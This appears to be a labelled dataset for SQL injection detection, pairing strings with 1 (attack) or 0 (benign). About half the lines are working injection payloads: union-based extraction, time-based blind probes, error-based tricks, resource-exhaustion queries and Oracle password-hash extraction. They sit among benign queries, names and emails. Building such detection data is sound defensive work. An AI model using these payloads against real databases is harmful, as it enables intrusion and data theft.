select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6051  =  6051;1
"UPDATE inventory SET description = '2023-01-01' WHERE created_at = 'user123';";0
iif  (  7011  =  2522,1,1/0  )  ;1
DELETE FROM window WHERE gas = 'tube';0
SELECT * FROM honor 3;0
1   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --;1
1 where 4949  =  4949;1
-1634%' union all select 5937,5937,5937,5937--;1
SELECT * FROM chamber WHERE brave  BETWEEN 10 AND 20;0
SELECT * FROM hunt WHERE drew NOT IN  ( 'snake', 'hill', 'plural' )  ;0
1%'   )    )    union all select null,null,null,null#;1
dellinge;0
1%' and 4595  =  4595#;1
maiga;0
"-9119""  )   where 9237  =  9237 or 8571  =  8571--";1
" select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1";1
SELECT * FROM person;0
SELECT * FROM accurate WHERE camp BETWEEN '1996-07-01' AND '1996-07-31';0
SELECT * FROM press;0
16926;0
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--;1
1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||';1
gering;0
1%'  )   union all select null#;1
SELECT thick, doctor+ ', ' + creature+ ' ' + these+ ', ' + balance AS list  FROM wool;0
SELECT since, term, youngFROM crack WHERE bottom  IS NOT NULL;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#;1
"UPDATE inventory SET name = 'john@example.com' WHERE price = 123;";0
SELECT human FROM heading;0
1 union all select null,null--;1
SELECT COUNT ( jarID ) FROM teeth;0
SELECT these ( s )  FROM clear SELECT strange ( s ) ;0
select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq';1
SELECT * FROM per WHERE customs = 'setting' FETCH FIRST 3 ROWS ONLY;0
abietceo;0
hau;0
1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
select   (  case when   (  3676  =  8635  )   then 3676 else 1/  (  select 0  )   end  )  --;1
SELECT * FROM search FETCH FIRST 3 ROWS ONLY;0
SELECT * FROM anybody FETCH FIRST 50 PERCENT ROWS ONLY;0
"1"" where 9173  =  9173 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --";1
-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904;1
SELECT AVG ( Price ) FROM consist;0
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ;1
-6298' or 4724  =  4876;1
goman@fbi-criminal-network.com.mh;0
"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp";1
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo;1
waitfor delay '0:0:5'-- thuo;1
-4331  )   as inpx where 9804  =  9804 union all select 9804#;1
patterso;0
SELECT * FROM tail WHERE herd = 'sun'  AND  ( film = 'entirely' OR become = 'sport' ) ;0
SELECT * FROM load WHERE living  BETWEEN 10 AND 20;0
SELECT COUNT ( least ) FROM massage;0
SELECT * FROM continued ORDER BY zipper ASC, swam DESC;0
1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ;1
-3859  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  5846  =  5846;1
SELECT COUNT ( today ) FROM atomic;0
-1765'  )   order by 1--;1
-1219'  )   or 5592  =  4835;1
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1";1
or uid like '%;1
"INSERT INTO users (id, description, status, quantity) VALUES ('2023-01-01', 'Sample text', 456, '2023-01-01');";0
SELECT * FROM spread ORDER BY say;0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i;1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""%""  =  """;1
SELECT COUNT ( about ) , sunlight FROM anywhere BY together;0
jndula couttolenc;0
""") or pg_sleep(5)--";1
' ';1
-4347' union all select 6074,6074,6074,6074,6074,6074,6074--;1
DELETE FROM weigh;0
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3;1
SELECT * FROM mixture  WHERE opportunity NOT LIKE '[mother]%';0
SELECT * FROM needs WHERE into BETWEEN printed09/01/1996prize AND exclaimed15/31/1996scale;0
"SELECT name, id FROM orders WHERE user_id = 'user123';";0
"hi or 1  =  1 --""";1
"1""   )    )     )   union all select null,null,null,null,null--";1
1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm;1
"UPDATE logs SET created_at = 'Sample text' WHERE name = '2023-01-01';";0
"1""  )   where 6128  =  6128 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --";1
SELECT * FROM tales WHERE mark = 'curious'  OR out = 'damage';0
"SELECT name, id FROM orders WHERE user_id = 'user123';";0
mccollon@irmedia.ca;0
ORDER BY 5;1
79274775p;0
SELECT barn, although, around FROM without WHERE speed  IS NULL;0
lenya@fbi-criminal-network.com.mil;0
"DELETE FROM logs WHERE id = 123;";0
/;1
SELECT * FROM vowel  WHERE layers NOT LIKE '[nearby]%';0
SELECT steady ( s FROM complex RIGHT JOIN;0
SELECT Count ( * )  AS discover;0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i;1
brias;0
SELECT * FROM just WHERE Price NOT BETWEEN 10 AND 20;0
"UPDATE customers SET status = 'active' WHERE price = 'pending';";0
end and    (    (   'vkle'  =  'vkle;1
SELECT COUNT ( tightID ) FROM noted;0
"SELECT user_id FROM orders WHERE user_id = 'user123';";0
1'  )   where 6622  =  6622 order by 1--;1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""wsmz"" like ""wsmz";1
select * from users where id  =  1 <@<@ or 1  =  1 -- 1;1
"1""  )   where 5129  =  5129 order by 1--";1
SELECT TOP 50 PERCENT * FROM bent;0
mota del cuervo;0
1  )   as boed where 6787  =  6787;1
-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715;1
"-4588"" union all select 4550,4550,4550,4550#";1
SELECT cold, garage, brownFROM orange WHERE coal  IS NOT NULL;0
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'ajka'  =  'ajka;1
"1%""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""%""  =  """;1
raqu$9omo;0
1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'cdgm' like 'cdgm;1
select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1;1
1  )   as jdhz where 2021  =  2021;1
SELECT AVG ( essential ) FROM row SELECT SUM ( gradually ) ;0
SELECT * FROM passage WHERE trouble LIKE '%pen%';0
"-3364%""   )    )     )   union all select 5464--";1
1  )   as vzyk where 5103  =  5103 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --;1
SELECT * FROM quarter WHERE although = 'grow';0
SELECT below ( s )  FROM dear UNION;0
1  )   as fxfe where 1148  =  1148 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #;1
SELECT COUNT ( what ) , everybody FROM lot BY meant;0
SELECT TOP 3 * FROM pig WHERE slow = 'cry';0
or 1 in   (  select @@version  )  --;1
"1""   )    )    as wwqj where 3249  =  3249 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --";1
nagyszeder.kehoe@creacionesacampada.es;0
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1";1
or 3  =  3;1
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'jhlj'  =  'jhlj;1
"UPDATE orders SET created_at = 'active' WHERE status = 'user123';";0
1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
1 where 5443  =  5443;1
SELECT AVG ( pan ) FROM conversation SELECT SUM ( notice ) ;0
1'  )   as dwgv where 1525  =  1525 union all select null,null--;1
SELECT * FROM balloon ORDER BY climate, mostly;0
4,80E+15;0
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16;1
-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#;1
SELECT * FROM tribe WHERE ought = 'possible'  OR carried = 'pattern';0
"1%""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""%""  =  """;1
"SELECT description, created_at, user_id FROM products WHERE description = 123;";0
pg_SLEEP(5)#;1
-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#;1
select * from generate_series  (  7407,7407,case when   (  7407  =  6562  )   then 1 else 0 end  )   limit 1--;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--;1
' GROUP BY columnnames having 1=1 --;1
4,47E+15;0
"SELECT * FROM meat WHERE powerful BETWEEN ""operation"" AND    ""knife""";0
"admin""  )   or   (  ""1""  =  ""1""/*";1
SELECT TOP 3 * FROM forgotten WHERE coast = 'boy' SELECT * FROM gently;0
1  )   where 1443  =  1443 union all select null,null,null,null,null#;1
1'+  (  select jxgx where 7446  =  7446 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
SELECT hidden ( s FROM kill RIGHT JOIN;0
1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +';1
SELECT TOP 3 * FROM magic;0
SELECT cook FROM lot;0
select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1;1
1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
select * from users where id  =  1 union select +!<1,version  (    )   -- 1;1
SELECT * FROM planned WHERE NOT ourselves = 'nervous'  AND NOT open = 'particular';0
1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh;1
SELECT TOP 50 PERCENT * FROM same SELECT * FROM love FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wood;0
"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """;1
real de montroi;0
SELECT war ( s )  FROM daughter FULL OUTER JOIN;0
SELECT * FROM  ( SELECT trade FROM package ) ;0
SELECT understanding, seldom+ ', ' + dull+ ' ' + route+ ', ' + fully AS ill  FROM nine;0
SELECT workerID AS ID, mostly AS spin FROM room;0
SELECT * FROM money 3;0
1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf;1
select * from users where id  =  1 %!<1 or 1  =  1 -- 1;1
SELECT * FROM born 3 SELECT * FROM us;0
reiji;0
"INSERT INTO inventory (price, name, id) VALUES ('active', '2023-01-01', 456);";0
SELECT * FROM fewer WHERE largest NOT BETWEEN 'jungle' AND 'house';0
"1%""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --";1
robert graves, 101;0
2100;0
"SELECT status, user_id, id FROM products WHERE description = 123;";0
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1";1
SELECT COUNT ( what ) , everybody FROM lot BY meant;0
-4955%' union all select 5928,5928--;1
"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""wwaq""  =  ""wwaq";1
"admin"") or ""1""=""1""--";1
select * from users where id  =  '1' union select .#,@@VERSION -- 1';1
(  select * from generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   limit 1  )  ;1
"1""   )    )    as ljhz where 2416  =  2416";1
ORDER BY 1,SLEEP(5),3--;1
-8186%' or elt  (  1032  =  1032,3623  )   and '%'  =  ';1
74;0
SELECT * FROM held WHERE continued = 'balloon'  AND  ( imagine = 'many' OR furniture = 'badly' ) ;0
exec xp;1
zarzuela;0
SELECT * FROM smoke WHERE chief NOT LIKE '[ought]%';0
1  )   as afxc where 7497  =  7497;1
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ";1
SELECT * FROM something ORDER BY weak ASC, sugar DESC;0
"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #";1
1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --;1
1%'  )   order by 1--;1
"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw";1
-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038;1
-9156'   )    )    union all select 9110,9110,9110,9110#;1
SELECT * FROM  ( SELECT while FROM kids ) ;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--;1
8759;0
select * from users where id  =  1 +   (  $+  )   union select null,@@VERSION -- 1;1
SELECT * FROM famous WHERE sometime BETWEEN stick09/01/1996gulf AND lesson15/31/1996near;0
1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ;1
SELECT TOP 50 PERCENT * FROM college SELECT * FROM alone FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM jet;0
522lta;0
ma724-3ra;0
SELECT * FROM down ORDER BY all DESC;0
1 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --;1
ORDER BY 13#;1
1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +';1
tartarizar;0
1 rlike sleep  (  5  )  #;1
INSERT INTO vote ( frame, more, from, date, simple, children )  VALUES  ( 'stand', 'love'. upon', 'mill', 'if', 'system', 'deep' )  ;0
-5742' where 1314  =  1314 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --;1
"SELECT quantity, user_id FROM products WHERE status = '2023-01-01';";0
-7610' or 3038  =  3038;1
SELECT drop;0
1'+  (  select wpbj where 1849  =  1849;1
mary-ann;0
select   (  case when   (  7005  =  7118  )   then 1 else 7005*  (  select 7005 from master..sysdatabases  )   end  )  --;1
11615910j;0
SELECT * FROM either FETCH FIRST 50 PERCENT ROWS ONLY;0
"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#";1
ORDER BY 16;1
SELECT face ( s )  FROM hurried;0
SELECT * FROM breakfast FETCH FIRST 50 PERCENT ROWS ONLY;0
"DELETE FROM orders WHERE email = 123;";0
"1%""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """;1
select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1;1
SELECT compare ( s FROM supply RIGHT JOIN;0
and (select substring(@@version,1,1))='X';1
SELECT AVG ( court ) FROM yourself SELECT SUM ( success ) ;0
"SELECT id, created_at, description, price FROM products WHERE name = 'user123';";0
SELECT went ( s )  FROM using LEFT JOIN;0
1'   )    )     )   order by 1#;1
"INSERT INTO customers (user_id, description) VALUES ('user123', '2023-01-01');";0
1'   )    )    as tfub where 3461  =  3461 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --;1
SELECT AVG ( court ) FROM yourself SELECT SUM ( success ) ;0
"INSERT INTO orders (user_id, status) VALUES (123, 123);";0
SELECT * FROM case ORDER BY somebody DESC;0
select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1;1
"1""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #";1
"DELETE FROM inventory WHERE description = 'pending';";0
SELECT * FROM practical FETCH FIRST 50 PERCENT ROWS ONLY;0
"-7884"" where 3297  =  3297 or 2492  =  6158";1
SELECT COUNT ( womenID ) FROM merely;0
"-2072""  )   as rjcz where 2491  =  2491 or 6872  =  6872--";1
1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi;1
SELECT * FROM apple WHERE Price NOT BETWEEN 10 AND 20;0
SELECT * FROM poetry;0
1%'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  ';1
1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
SELECT * FROM why WHERE quiet BETWEEN 'individual' AND 'at';0
SELECT Count ( * )  AS properly;0
SELECT hiddenID AS ID, aid AS fell FROM bet;0
"UPDATE customers SET created_at = 123 WHERE id = 456;";0
02906029w;0
ORDER BY 28--;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14;1
SELECT * FROM across FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM reason;0
SELECT * FROM dear WHERE corner = 'street';0
palacio@eldeseodepecar.kn;0
SELECT boat ( s ) FROM tribe INNER JOIN;0
1%'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  '%'  =  ';1
-1386'  )   or   (  7880  =  5362  )  *5362 and   (  'vsyu' like 'vsyu;1
"1""  )   where 7010  =  7010 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
SELECT TOP 3 * FROM same;0
"1""  )   where 2136  =  2136 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --";1
SELECT Employees.house, COUNT ( Orders.picturedID )  AS nationalFROM    ( OrdersINNER JOIN series ON Orders.deeplyID  =  Employees.positionID ) ;0
SELECT TOP 3 * FROM managed SELECT * FROM upon 3SELECT * FROM down;0
1'   )    )    as plbt where 4368  =  4368 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --;1
tronchuda;0
SELECT TOP 3 * FROM thrown SELECT * FROM became 3SELECT * FROM little;0
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""ureu"" like ""ureu";1
7,41E+15;0
SELECT * FROM becoming WHERE hunter IN  ( SELECT thin FROM guess ) ;0
"1%""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""%""  =  """;1
UPDATE grain SET bark = 'tower'WHERE easier = 'coast';0
SELECT AVG ( chapter ) FROM all SELECT SUM ( parallel ) ;0
SELECT drew;0
"1%""   )    )     )   union all select null,null--";1
SELECT * FROM came  WHERE sun NOT LIKE '[column]%';0
UNION ALL SELECT 1,2,3#;1
-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25;1
SELECT * FROM quietly ORDER BY myself ASC, beneath DESC;0
"1%""  )   and elt  (  4249  =  4249,7259  )   and   (  ""%""  =  """;1
1   )    )    as xebl where 3105  =  3105 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --";1
INSERT INTO large ( paid, ride, clothes, success, minute, porch )  VALUES  ( 'word', 'had'. nose', 'cold', 'way', 'pencil', 'coat' )  ;0
SELECT * FROM  ( SELECT far FROM handle ) ;0
select * from users where id  =  '1' or <   =  1 union select 1,@@VERSION -- 1';1
SELECT * FROM discover  WHERE every = married;0
SELECT * FROM screen WHERE thank = 'across' FETCH FIRST 3 ROWS ONLY;0
"DELETE FROM customers WHERE created_at = 'Sample text';";0
SELECT difficultyID AS ID, save AS even FROM highest;0
c/ alcorac, 102;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--;1
SELECT flew FROM couple UNION ALL SELECT wrapped FROM turn ORDER BY yesterday;0
aguilar de cods;0
1%'  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
SELECT MIN ( customs )  AS telephone FROM zipper;0
SELECT rock ( s )  FROM addition SELECT gravity ( s ) ;0
UPDATE airplane SET question = 'first'WHERE basket = 'colony';0
DELETE FROM hit;0
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1";1
SELECT touch,distant,gun FROM into LEFT JOIN Orders ON hardly.termID =  apart.view ORDER BY forward.discussion;0
"1%""  )   and 8024  =  3560--";1
pascuala;0
3625;0
select * from generate_series  (  9434,9434,case when   (  9434  =  3991  )   then 1 else 0 end  )   limit 1--;1
1' ORDER BY 3--+;1
calle vereda del carmen, 160 11-e;0
1  )   as oknr where 3228  =  3228;1
"-4031%"" union all select 9566--";1
select   (  case when   (  7980  =  3703  )   then 7980 else 7980*  (  select 7980 from information_schema.character_sets  )   end  )  #;1
c/ juan perez arriete 19 13e;0
"DELETE FROM customers WHERE price = 'user123';";0
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --";1
SELECT * FROM lower WHERE football  BETWEEN 10 AND 20;0
"INSERT INTO customers (price, name, id) VALUES ('active', 'john@example.com', 'active');";0
bolly;0
""" or ""x""  =  ""x";1
Time-Based:;1
SELECT * FROM putting ORDER BY thought, nice;0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol;1
select case when 1892  =  3646 then 1 else null end--;1
"-3081""   )    )     )   or 3736  =  1899";1
"DELETE FROM employees WHERE status = 'active';";0
benchmark(10000000,MD5(1))#;1
SELECT * FROM chain WHERE butter LIKE '%way%';0
SELECT * FROM behavior WHERE fur NOT IN  ( 'particles', 'term', 'boat' )  ;0
1%'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ';1
SELECT * FROM poetry;0
SELECT * FROM these WHERE due = 'one' FETCH FIRST 3 ROWS ONLY;0
"UPDATE employees SET price = 'john@example.com' WHERE email = 'user123';";0
SELECT * FROM type WHERE thirty = 'air'  OR proud = 'dog';0
SELECT * FROM compound WHERE smaller = 'consider'  AND City = 'mill';0
iif  (  8770  =  9611,1,1/0  )  ;1
1%'   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
ayca mols;0
SELECT COUNT ( made ) FROM promised;0
1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
"-2378"" where 2686  =  2686 or 6872  =  6872--";1
-1989%'   )    )    or 6179  =  8518#;1
